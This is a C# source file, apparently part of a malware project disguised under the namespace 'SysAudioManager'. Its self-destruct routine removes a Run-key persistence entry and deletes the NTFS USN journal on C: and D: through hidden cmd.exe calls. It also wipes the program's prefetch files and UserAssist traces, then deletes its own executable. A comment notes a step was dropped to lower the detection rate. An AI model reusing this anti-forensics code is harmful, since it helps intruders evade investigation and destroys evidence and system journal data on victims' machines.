using FoxDrop;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SysAudioManager
{
    internal class Destruct
    {
        public static void selfDestruct()
        {
            Variables.debugLog($"[*] Destruction initialized in {(Variables.SILENT_DESTRUCTION ? "SILENT" : "NOISY")} mode");

            // Delete persistence & runtime keys.
            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)?.DeleteValue(Variables.registryFolderName, false);
            Variables.debugLog($"[*] Deleted persistence key.");

            Registry.CurrentUser.DeleteSubKeyTree($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}", false);
            Variables.debugLog($"[*] Deleted runtime keys.");

            if (!Variables.SILENT_DESTRUCTION)
            {
                #region Delete Journal
                try
                {
                    ProcessStartInfo startInfoz = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        ErrorDialog = false,
                        Arguments = "fsutil usn deletejournal /d C:",
                        FileName = "cmd.exe"
                    };
                    Process.Start(startInfoz);
                }
                catch
                {
                    Environment.Exit(0);
                }
                try
                {
                    ProcessStartInfo startInfo2 = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        ErrorDialog = false,
                        Arguments = "fsutil usn deletejournal /d D:",
                        FileName = "cmd.exe"
                    };
                    Process.Start(startInfo2);
                }
                catch
                {
                    Environment.Exit(0);
                }

                Variables.debugLog($"[*] Deleted Journal");

                #endregion
                #region prefetch
                try
                {
                    string fullName = Assembly.GetEntryAssembly().Location;
                    string myName = Path.GetFileNameWithoutExtension(fullName);

                    try
                    {
                        foreach (string thefile in Directory.GetFiles("C:\\Windows\\prefetch\\"))
                        {
                            if (thefile.Contains(myName.ToUpper() + ".") && thefile.Contains(".pf"))
                            {
                                try
                                {
                                    File.Delete(thefile);
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                }
                catch { }

                Variables.debugLog($"[*] Deleted Prefetch, though better to manually check.");
                #endregion
                #region explorer - pcaclient

                // function removed for too much noise, other than increasing detection rate.

                #endregion
                #region UserAssist
                try
                {
                    string explorerKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count";
                    using (RegistryKey explorerKey = Registry.CurrentUser.OpenSubKey(explorerKeyPath, writable: true))
                    {
                        if (explorerKey != null)
                        {
                            explorerKey.DeleteValue(HashingAndCipher.CCEncipher(Application.ExecutablePath, 13));
                        }
                    }
                }
                catch { }

                Variables.debugLog($"[*] Deleted UserAssist");
                #endregion
            }

            selfDelete();
        }

        public static void selfDelete()
        {
            string currentProcessPath = Process.GetCurrentProcess().MainModule.FileName;
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + currentProcessPath + "\"",
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(startInfo);
            Environment.Exit(0);
        }
    }
}
